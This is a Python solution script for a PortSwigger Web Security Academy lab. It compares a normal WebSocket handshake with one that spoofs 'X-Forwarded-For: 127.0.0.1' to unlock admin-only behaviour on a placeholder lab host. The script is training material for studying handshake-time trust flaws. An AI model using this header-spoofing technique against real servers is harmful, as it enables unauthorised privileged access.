"""
Lab 2: Manipulating the WebSocket handshake to exploit vulnerabilities
https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities
Difficulty: Practitioner

📝 The server trusts a header checked only at handshake time (commonly
X-Forwarded-For, treated as a trusted-internal-IP indicator for debug/admin
access) rather than re-validating per message or via proper auth. Tamper
with that header during the handshake to unlock privileged behavior for
the whole connection.
"""

from utils import ws_handshake, send_ws_text, recv_ws_text, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"
WS_PATH = "/chat"


def run():
    note("Baseline: handshake with no special headers.")
    sock, resp = ws_handshake(HOST, WS_PATH)
    log("Baseline handshake succeeded.")
    send_ws_text(sock, "READY")
    log(f"Baseline response: {recv_ws_text(sock)!r}")

    note("Now retry with X-Forwarded-For: 127.0.0.1 — a common trusted-")
    note("internal-source spoof that some backends use to grant elevated")
    note("behavior to 'local' traffic without further auth.")

    sock2, resp2 = ws_handshake(
        HOST, WS_PATH,
        extra_headers=["X-Forwarded-For: 127.0.0.1"],
    )
    log("Spoofed-header handshake succeeded.")
    send_ws_text(sock2, "READY")
    log(f"Spoofed-header response: {recv_ws_text(sock2)!r}")

    note("Compare the two responses — if the second reveals admin-only")
    note("content/commands, the handshake-time header is the trust anchor")
    note("to abuse. If this specific header doesn't work, check the page's")
    note("own JS for which header it ACTUALLY reads during connection setup.")


if __name__ == "__main__":
    run()
